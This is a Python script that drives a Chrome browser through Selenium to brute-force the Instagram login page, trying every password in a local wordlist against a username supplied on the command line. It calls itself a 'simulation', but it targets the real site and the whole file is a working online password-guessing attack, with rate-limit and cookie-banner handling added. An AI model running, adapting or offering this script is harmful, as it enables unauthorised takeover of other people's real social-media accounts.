import argparse
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

def bruteforce_wordlist(user, rate_limit):
    """
    Grabs a word from the wordlist and passes it to attemt_login()
    """
    with open('./ordlista.txt', 'r') as wl:
        for word in wl:
            time.sleep(rate_limit)
            try:
                attempt_login(user, word)
            finally:
                print("Done")

def find_elements(driver):
    """
    Grabs all the elements we need to manipulate the loginpage.
    """
    # Clear the fields before sending keys
    global username_field
    username_field = driver.find_element(By.NAME, 'username')
    global password_field
    password_field = driver.find_element(By.NAME, 'password')

    # Find the login button and click it
    global login_button
    login_button = driver.find_element(By.XPATH, "//button[@type='submit']/..")

def attempt_login(username, password):
    """
    Clears inputfields and tries to login in with our supplied credentials.
    """
    username_field.send_keys(Keys.CONTROL, "a")
    username_field.send_keys(Keys.DELETE)
    password_field.send_keys(Keys.CONTROL, "a")
    password_field.send_keys(Keys.DELETE)
    username_field.send_keys(username)
    password_field.send_keys(password)
    print(f'Trying password: {password}')
    login_button.click()


def main():
    """
    Main function
    """
    parser = argparse.ArgumentParser(description="Brute-force attack simulation with Selenium.")
    parser.add_argument("--user", required=True, help="Username for login")
    parser.add_argument("--rate-limit", type=float, default=5,
                        help="Delay between login attempts in seconds (optional)") # Ratelimit set to 10sec!
    args = parser.parse_args()

    driver = webdriver.Chrome()

    driver.get('https://www.instagram.com')
    time.sleep(1)
    try: #If cookie overlay -> select Decline optional Cookies
        driver.find_element(By.XPATH, "//button[2]").click()
    finally:
        print("Cookies declined")
    time.sleep(2)

    find_elements(driver) # Grab inputfields and login button.
    bruteforce_wordlist(args.user, args.rate_limit) # Starts bruteforcing
    
    driver.quit()

if __name__ == "__main__":
    main()

